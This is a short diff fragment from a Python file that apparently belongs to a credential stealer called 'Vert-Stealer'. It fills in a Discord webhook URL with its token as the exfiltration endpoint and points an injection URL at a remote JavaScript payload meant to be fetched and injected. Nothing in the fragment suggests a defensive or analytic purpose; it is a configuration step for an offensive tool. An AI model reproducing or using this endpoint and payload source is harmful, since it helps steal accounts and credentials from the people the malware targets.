@@ -15,7 +15,7 @@ import random
 import re
 import subprocess
  
-hook = "WEBHOOK HERE"     
+hook = "https://discord.com/api/webhooks/1515852684408786974/EjGlg48kL8GJal3WYBHJTXEnDU7un_4q5EbhKw38od1m8wA1-HAxpk1jrayyivhuzv_S"     
 injecturl = "https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/Injection/inject.js"
 
 DETECTED = False
